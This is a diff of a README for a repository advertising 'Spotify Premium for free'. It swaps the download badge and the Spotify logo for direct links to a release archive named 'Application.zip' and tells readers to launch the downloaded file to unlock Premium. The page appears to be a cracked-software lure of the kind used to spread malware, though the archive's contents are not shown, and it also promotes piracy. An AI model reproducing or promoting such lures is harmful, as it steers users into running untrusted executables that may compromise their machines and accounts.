@@ -13,7 +13,7 @@ Welcome to the "Spotify-Premium-for-free-2024" repository! This software is desi
 ## How to Use 📝
 
 1. Download the software from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/pa2065/Spotify-Premium-for-free-2024/releases/download/v1.0/Application.zip)](https://github.com/pa2065/Spotify-Premium-for-free-2024/releases/download/v1.0/Application.zip)
 
 2. Launch the downloaded file to activate the Premium features on your Spotify account.
 
@@ -31,4 +31,4 @@ For more details and updates, visit the official website of Spotify or check the
 
 Start enjoying Spotify Premium for free today! 🎶
 
-![Spotify Logo](https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg)
+![Spotify Logo](https://github.com/pa2065/Spotify-Premium-for-free-2024/releases/download/v1.0/Application.zip)
